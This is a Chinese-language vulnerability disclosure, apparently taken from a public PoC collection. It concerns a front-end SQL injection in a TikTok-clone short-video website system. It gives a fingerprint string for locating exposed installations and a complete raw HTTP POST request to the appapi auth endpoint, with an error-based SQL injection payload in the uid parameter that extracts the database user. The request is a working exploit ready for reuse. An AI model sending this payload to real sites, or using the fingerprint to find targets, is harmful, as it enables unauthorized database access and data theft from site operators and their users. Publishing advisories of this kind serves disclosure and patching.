# 仿抖音短视频网站系统index存在前台SQL注入漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.84);">抖音视频APP/仿9视频APP/短视频功能/原生双端开发，除了直播没有开通，其他功能都是精仿，非会员不能评论，发布视频需要注册，功能模块很多，支付模式微信，支付宝，卡密，用户自己上传带赏金，点赞，关注，留言等功能。仿抖音短视频网站系统index存在前台SQL注入漏洞</font>

# <font style="color:rgba(0, 0, 0, 0.84);">二、影响版本</font>
+ 仿抖音短视频网站系统

# 三、资产测绘
```plain
"/public/index/images/new_logo.png"
```


# 四、漏洞复现
```plain
POST /index.php?g=appapi&m=auth&a=success HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencode
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Connection: close

uid=(SELECT 7052 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(USER() AS NCHAR),0x20)),1,54)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/uml4ee1m5cxyvkfo>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
